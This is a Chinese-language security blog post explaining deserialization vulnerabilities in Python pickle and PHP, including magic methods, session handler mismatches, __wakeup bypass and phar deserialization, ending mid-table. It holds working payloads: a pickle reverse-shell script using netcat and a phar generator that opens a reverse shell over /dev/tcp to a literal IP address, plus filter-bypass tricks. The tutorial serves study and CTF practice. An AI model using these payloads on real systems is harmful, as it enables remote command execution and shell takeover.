<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>反序列化 · Mini's blog</title><meta name="description" content="原理序列化： 把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程（如 JSON、XML、二进制流等）
反序列化： 把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程，也可以说就是将压缩格式化的对象还原成初始状态的过程
注意
反序列化的时候一定要保证在当前的作用域环"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>反序列化</a></h3></div><div class="post-content"><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>序列化：</strong> 把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程（如 JSON、XML、二进制流等）</p>
<p><strong>反序列化：</strong> 把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程，也可以说就是将压缩格式化的对象还原成初始状态的过程</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>反序列化的时候一定要保证在当前的作用域环境下有该类存在</li>
<li>在反序列化攻击的时候是依托类属性进行攻击，能控制的只有类的属性。在攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动发序列化攻击</li>
</ol>
<h2 id="python-反序列化漏洞"><a href="#python-反序列化漏洞" class="headerlink" title="python 反序列化漏洞"></a>python 反序列化漏洞</h2><blockquote>
<p>pickle 模块使用 <code>pickle.dump</code> 或 <code>pickle.dumps()</code> 函数序列化对象；使用 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 函数反序列化对象</p>
</blockquote>
<p><code>__reduce__</code> 方法提供了如何序列化对象及如何反序列化重建对象的详细信息。具体来说，它返回一个元组，其中包含足够的信息来重建对象。在进行序列化或反序列化时，如果这个对象定义了 <code>__reduce__</code> 方法，pickle 则模块会调用该方法</p>
<p>利用 pickle 和 <code>__reduce__</code> 生成执行命令的 payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个执行命令的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exec</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,cmd</span>):</span><br><span class="line">        self.cmd=cmd</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象，这个对象会在创建对象时被调用，</span></span><br><span class="line">    <span class="comment">#  第二个元素是可调用对象的参数，pickle.loads会解决import问题，对于未引入的module会自动尝试import</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(self.cmd,))</span><br><span class="line">        <span class="comment">#  os.system()会在子进程中执行系统命令，并在终端或命令行输出当前用户名</span></span><br><span class="line">        <span class="comment">#  os.system() 的返回值是命令执行后的退出状态码。如果命令成功执行并正常退出，通常返回值为 0</span></span><br><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line">res=<span class="built_in">exec</span>(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># 生成序列化数据</span></span><br><span class="line">payload=pickle.dumps(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Payload:&quot;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>上面代码运行后会生成执行 <code>whoami</code> 命令的 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: <span class="string">b&#x27;\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>pickle 模块对该 payload 进行反序列时，会造成命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie=<span class="string">b&#x27;\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">new_cookie = pickle.loads(cookie)</span><br></pre></td></tr></table></figure>

<h3 id="反弹-shell-脚本"><a href="#反弹-shell-脚本" class="headerlink" title="反弹 shell 脚本"></a>反弹 shell 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc [vps-ip] [vps-port] -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line"><span class="comment">## popen 也可以替换为 system</span></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(c))</span><br></pre></td></tr></table></figure>

<h3 id="手写-opcode"><a href="#手写-opcode" class="headerlink" title="手写 opcode"></a>手写 opcode</h3><p><em>待。。。</em></p>
<h2 id="PHP-反序列化漏洞"><a href="#PHP-反序列化漏洞" class="headerlink" title="PHP 反序列化漏洞"></a>PHP 反序列化漏洞</h2><blockquote>
<p>PHP中通常使用 <code>serialize</code> 函数进行序列化；使用 <code>unserialize</code> 函数进行反序列化</p>
</blockquote>
<p><code>serialize</code> 函数输出格式：</p>
<ul>
<li>NULL : N</li>
<li>Boolean : b:0 或 b:1（false 或 true）</li>
<li>Integer : i:数值 (i:123)</li>
<li>Float : d:数值 (d:1.23)</li>
<li>String : s:长度:”值” (s:4:”test”)</li>
<li>Object : O:类名长度:类名:字段数:字段 (O:8:”ClassName”:1:{s:3:”key”;s:5:”value”;} )</li>
</ul>
<p>如对下面类 A 进行序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;h1&gt;ABCD&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化一个对象a</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="comment">// 序列化对象a</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Serialize Object A: &quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>PHP 中序列化后的数据并没有像 Python 一样包含函数 <code>__construct</code> 和 <code>print</code> 的信息，而仅仅是<strong>类名</strong>和<strong>成员变量</strong>的信息。因此，在 <code>unserialize</code> 函数的参数可控的情况下，还需要代码中包含魔术方法才能利用反序列化漏洞</p>
<blockquote>
<p>注意：在序列化 private 声明的字段时候，类名和字段名前面都会加上 \0 的前缀，字符串长度也包括所加前缀的长度。这个在复制的时候是看不到的，需要手动改为 %00</p>
<p>注意：在序列化 protected 声明的字段的时候，会出现乱码，可以删除乱码将受保护的对象转换为公共对象，如 <code>s:5:&quot; * op&quot;;i:2;</code> 更改为<br> <code>s:2:&quot;pop&quot;;i:2;</code></p>
</blockquote>
<h3 id="PHP-魔术方法"><a href="#PHP-魔术方法" class="headerlink" title="PHP 魔术方法"></a>PHP 魔术方法</h3><ul>
<li><code>__construct()</code>：当对象创建时自动调用(在 <code>unserialize()</code> 结束后调用)</li>
<li><code>__wakeup()</code>：<code>unserialize()</code> 时先会调用这个函数，执行后不会执行 <code>__construct()</code> 函数</li>
<li><code>__unserialize()</code>：在对象被反序列化时自动执行，该方法接受一个参数，即反序列化时传入的数据数组，其中包含了序列化的属性和值。（如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略）</li>
<li><code>__destruct()</code>：当对象被销毁时会自动调用</li>
<li><code>__toString()</code>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用。例如执行 <code>echo new test();</code> 其就会自动调用对象中的 <code>__toStrong()</code> 方法；。在PHP5.2以前，<code>__toStrong()</code> 函数只有在 <code>echo</code>、<code>print</code> 时才生效；PHP5.2 以后则可以在任何字符串环境生效（例如通过<br> <code>printf</code>，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d修饰符）。自 PHP 5.2.0 起，如果将一个未定义 <code>__toString()</code> 方法的对象转换为字符串，会产生<br>E_RECOVERABLE_ERROR 级别的错误。此外，还有如下情况会触发此函数：<ul>
<li>反序列化对象与字符串连接时</li>
<li>反序列化对象参与格式化字符串时</li>
<li>反序列化对象与字符串进行 <code>==</code> 比较时</li>
<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
<li>反序列化对象在经过php字符串函数，如 <code>strlen()</code>、<code>addslashes()</code> 时</li>
<li>在 <code>in_array()</code> 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用</li>
<li>反序列化的对象作为 <code>class_exists()</code> 的参数的时候</li>
</ul>
</li>
<li><code>__get()</code>：当从不可访问或不存在的属性读取数据。例如从对象外部访问由 <code>private</code> 和 <code>protect</code> 修饰的属性，就会调用该方法，其中传递的形参为访问属性的属性名</li>
<li><code>__call($function, $parameters)</code>：在对象中调用一个不可访问或不存在的方法时调用，其中，方法名会作为 <code>__call()</code> 的第一个参数传入（<code>$function</code>），而不存在方法的参数会被装进数组中作为第二个参数传入（<code>$parameters</code>）</li>
<li><code>__invoke()</code>：当一个对象被当作函数调用时触发</li>
<li><code>__unset()</code>：销毁一个不存在的属性时（如 <code>unset($this-&gt;handle-&gt;log)</code>），会自动调用</li>
</ul>
<h3 id="PHP-Session-反序列化"><a href="#PHP-Session-反序列化" class="headerlink" title="PHP Session 反序列化"></a>PHP Session 反序列化</h3><h4 id="PHP-Session-配置"><a href="#PHP-Session-配置" class="headerlink" title="PHP Session 配置"></a>PHP Session 配置</h4><p>在 php.ini 中以下几个配置项与 Session 存储配置有关：</p>
<ul>
<li><p><code>session.save_path=&quot;&quot;</code> - session 存储路径</p>
</li>
<li><p><code>session.save_handler=files</code> - session 存储方式</p>
</li>
<li><p><code>session.auto_start=0</code> - 是否自动启动  session</p>
</li>
<li><p><code>session.serialize_handler</code> - session 序列化引擎，该配置项有以下几个选项</p>
</li>
</ul>
<p>php（默认引擎）：存储格式为 “键名|序列化的值” </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>php_binary：存储格式为 “键名长度的 ASCII 字符+键名+序列化的值”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[EOT]names:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="comment"># name 长度为 4，4在 ASCII 表中对应 EOT，EOT 字符无法正常显示</span></span><br></pre></td></tr></table></figure>

<p>php_serialize：存储格式为 “序列化的值”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Session-反序列化漏洞"><a href="#Session-反序列化漏洞" class="headerlink" title="Session 反序列化漏洞"></a>Session 反序列化漏洞</h4><p>如果 PHP 在序列化存储 <code>$_SESSION</code> 使用的引擎和反序列化使用的引擎不一致，会导致数据无法正确的反序列化</p>
<p>例如，如果使用 php_serialize 引擎存储下面的 <code>$_SESSION</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;|O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>则最终存储在 session 文件中的内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:36:&quot;|O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>而如果其他页面使用不同的引擎，则会导致错误的解析</p>
<p>如使用 php 引擎来读取上面的 session 内容，由于 php 引擎会以 <code>|</code> 作为 key 和 value 的分割符，那么会将 <code>a:1:&#123;s:4:&quot;name&quot;;s:36:&quot;</code> 作为 session 的 key，将 <code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</code> 作为 value，然后反序列化得到 A 这个类</p>
<h3 id="PHP-反序列化绕过"><a href="#PHP-反序列化绕过" class="headerlink" title="PHP 反序列化绕过"></a>PHP 反序列化绕过</h3><h4 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h4><p><code>preg_match(&#39;/^O:\d+/&#39;)</code> 匹配序列化字符串是否是对象字符串开头</p>
<ul>
<li><code>+</code> 号绕过：<code>&#39;O:4&#39;</code> -&gt; <code>&#39;O:+4&#39;</code></li>
<li>将要序列化的对象放在数组中绕过：<code>serialize(array($a))</code></li>
</ul>
<p><code>preg_match(&#39;/ctfshow/&#39;, $cs</code> 匹配类名</p>
<ul>
<li>大小写类名绕过：<code>CtFShOw</code></li>
</ul>
<h4 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过 __wakeup 方法"></a>绕过 <code>__wakeup</code> 方法</h4><p>反序列化的时候会首先执行 <code>__wakeup</code> 方法，但有时候需要绕过 <code>__wakeup</code> 方法，直接执行 <code>__destruct</code> 方法，因此需要进行绕过</p>
<p>当<strong>属性个数大于实际属性个数</strong>的时候，会直接执行 <code>__destruct</code> 方法，如下所示：</p>
<p>原语句有两个属性</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>将表示属性个数的数字加一</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>利用条件：</p>
<ol>
<li>phar文件要能够上传到服务器端</li>
<li>可用的魔术方法</li>
<li>文件操作函数可控</li>
</ol>
<h4 id="phar-文件结构"><a href="#phar-文件结构" class="headerlink" title="phar 文件结构"></a>phar 文件结构</h4><p>phar 是 PHP 的一个归档文件格式，可以用于打包多个文件，类似于 zip 文件。PHP 内置了处理相关操作的 <code>Phar</code> 类，php.ini 中的 <code>phar.readonly</code> 配置项控制是否允许创建 phar 文件</p>
<p>phar 文件结构主要由四部分组成：</p>
<ol>
<li>Phar file stub (头部标识)</li>
</ol>
<blockquote>
<p>格式为 <code>xxx&lt;?php xxx;  __HALT_COMPILER();?&gt;</code></p>
<p>前面 <code>xxx</code> 内容不限，但必须以 <code>__HALT_COMPILER();?&gt;</code> 来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件</p>
</blockquote>
<ol start="2">
<li>Phar manifest file entry definition （内容清单）</li>
</ol>
<blockquote>
<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分</p>
<p>这部分还会以<strong>序列化</strong>的形式存储用户自定义的 <strong>meta-data</strong>，这是上述攻击手法最核心的地方</p>
</blockquote>
<img src="/2024/08/15/deserialization/phar-file.png" class="">

<ol start="3">
<li>the file contents</li>
</ol>
<blockquote>
<p>被压缩的文件内容</p>
</blockquote>
<ol start="4">
<li>(optional) a signature for verifying Phar integrity (phar file format only)</li>
</ol>
<blockquote>
<p>文件签名，在文件末尾</p>
</blockquote>
<h4 id="phar-测试用例"><a href="#phar-测试用例" class="headerlink" title="phar 测试用例"></a>phar 测试用例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="string">&quot;bash -c &#x27;sh -i &amp;&gt;/dev/tcp/142.171.76.223/7777 0&gt;&amp;1&#x27;&quot;</span>;	<span class="comment"># 反弹shell</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;1.phar&#x27;</span>);  <span class="comment"># 生成的phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment"># </span></span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);  <span class="comment"># 写入反序列化的内容</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>); <span class="comment"># 添加压缩的内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  <span class="comment"># 计算标签</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述代码会生成 phar.phar 文件，其中 meta-data 以序列化的形式存储</p>
</blockquote>
<h4 id="phar-漏洞利用"><a href="#phar-漏洞利用" class="headerlink" title="phar 漏洞利用"></a>phar 漏洞利用</h4><p>php 大部门的<strong>文件系统函数</strong>在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 反序列化，包括以下函数：</p>
<img src="/2024/08/15/deserialization/phar-functions.png" class="" title="phar-functions">


<p>phar 反序列化测试用例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;_destruct() called!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>); </span><br><span class="line">	<span class="comment">//unlink($filename);</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><ol>
<li><p>限制 phar 字符不能出现在前面，可以使用 <code>compress.bzip2://</code> 、<code>compress.zlib://</code> 等绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br></pre></td></tr></table></figure></li>
<li><p>利用 <code>filter</code> 过滤器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li>
<li><p>GIF 格式验证可以通过在文件头部添加 <code>GIF89a</code> 绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤 <code>__HALT_COMPILER();</code></p>
</li>
</ol>
<ul>
<li><p>将 phar 文件进行 gzip 压缩 ，使用压缩后 phar 文件同样也能反序列化 (常用)，linux 下使用 gzip 命令进行压缩</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip phar.phar</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 phar 的内容写进压缩包注释中，也同样能够反序列化成功，压缩为 zip 也会绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();  </span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li>修改 phar 签名</li>
</ol>
<p>某些情况需要修改 phar 文件中的内容而达到某些需求(比如要绕过 <code>__wakeup</code> 要修改属性数量)，而修改后的 phar 文件由于文件发生改变，所以须要修改签名才能正常使用，phar 支持签名的格式有 MD5、SHA1、SHA256、SHA512 和 OPENSSL</p>
<table>
<thead>
<tr>
<th align="center">字节长度</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">可变的</td>
